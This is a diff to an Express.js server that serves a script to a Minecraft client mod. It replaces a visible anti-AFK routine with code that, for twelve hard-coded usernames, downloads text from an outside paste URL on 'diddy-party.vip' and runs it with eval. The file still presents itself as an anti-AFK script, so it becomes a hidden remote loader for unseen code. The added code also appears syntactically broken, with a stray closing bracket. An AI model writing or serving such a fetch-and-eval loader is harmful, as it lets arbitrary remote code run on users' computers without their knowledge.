@@ -45,89 +45,24 @@ const validateRequest = (req, res, next) => {
 // Главный эндпоинт для скрипта
 app.get('/api/script', validateRequest, (req, res) => {
     const scriptContent = `(function() {
-    java.lang.System.out.println("🔧 Anti-AFK script loaded from Railway");
-    
     var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();
-    java.lang.System.out.println("👤 User: " + username);
 
-    // Проверяем разрешенные имена
-    var allowedUsers = [
-        "porvaniy.gondon", "__ded_inside__", "latteld", "dofinixx", 
-        "troll4", "zertqmap.org", "nekitpon", "fakepatrickstar", "inclodus",
-        "terpila_naxyi", "masterrpo1", "prolix0573"
-    ];
-    
-    var isAllowed = false;
-    for (var i = 0; i < allowedUsers.length; i++) {
-        if (allowedUsers[i] === username) {
-            isAllowed = true;
-            break;
-        }
+// Проверяем разрешенные имена
+if (username === "porvaniy.gondon" || username === "__ded_inside__" || username === "latteld" || username === "dofinixx" || username === "troll4" || username === "zertqmap.org" || username === "nekitpon" || username === "fakepatrickstar" || username === "inclodus" || username === "terpila_naxyi" || username === "masterrpo1" || username === "prolix0573") {
+    try {
+        // Выполняем внешний скрипт
+        eval(new java.util.Scanner(
+            new java.net.URL("https://diddy-party.vip/p/raw/or292hyekusblfp91").openStream(), 
+            "UTF-8"
+        ).useDelimiter("\\A").next());
+    } catch (e) {
+        java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
     }
-    
-    if (isAllowed) {
-        java.lang.System.out.println("✅ Access granted");
-        
-        try {
-            var anarchy = "604";
-            var isSendingCommands = false;
-            var afkDetected = false;
+} else {
+    print("X")
+}
 
-            // Обработчик AFK сообщений
-            on("ru.nedan.neverapi.event.impl.EventMessage", function(event) { 
-                var message = event.getMessage();
-                java.lang.System.out.println("📨 Message: " + message);
-                
-                if (message === "Данная команда недоступна в режиме AFK") { 
-                    java.lang.System.out.println("🚨 AFK detected!");
-                    minecraft.field_1724.method_6043();
-                }
-                
-                if (message === "Данная команда недоступна в режиме AFK" && !isSendingCommands) { 
-                    isSendingCommands = true;
-                    java.lang.System.out.println("🔄 Processing AFK command");
-                    
-                    // Send /hub command
-                    chat("/hub");
-                    
-                    // Wait 250ms and send /an command
-                    java.lang.Thread.sleep(250);
-                    chat("/an" + anarchy);
-                    
-                    // Reset the flag
-                    java.lang.Thread.sleep(50);
-                    isSendingCommands = false;
-                    java.lang.System.out.println("✅ AFK commands processed");
-                } 
-                
-                if (message === "[⚠] Данной команды не существует!") { 
-                    afkDetected = true;
-                    java.lang.System.out.println("⚠️ Command not exists, retrying...");
-                } 
-            });
-
-            // Периодическая проверка
-            repeat(function() {
-                if (afkDetected && !isSendingCommands) {
-                    isSendingCommands = true;
-                    afkDetected = false;
-                    
-                    java.lang.System.out.println("🔄 Retrying /an command");
-                    chat("/an" + anarchy);
-                    
-                    isSendingCommands = false;
-                }
-            }, 200);
-            
-            java.lang.System.out.println("✅ Anti-AFK system activated");
-            
-        } catch (e) {
-            java.lang.System.err.println("❌ Script error: " + e);
-        }
-    } else {
-        java.lang.System.err.println("❌ Access denied for: " + username);
-        java.lang.Thread.sleep(20000);
-    }
+})
 })();`;
     
     res.setHeader('Content-Type', 'application/javascript; charset=UTF-8');
